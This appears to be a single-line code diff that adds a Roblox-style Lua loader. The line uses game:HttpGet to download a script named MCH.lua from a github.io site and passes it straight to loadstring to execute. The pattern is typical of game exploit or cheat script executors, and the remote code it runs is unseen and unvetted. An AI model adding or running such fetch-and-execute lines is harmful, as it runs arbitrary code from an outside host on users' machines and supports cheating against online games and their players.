@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cheeeeeeesy.github.io/MCH.lua", true))()
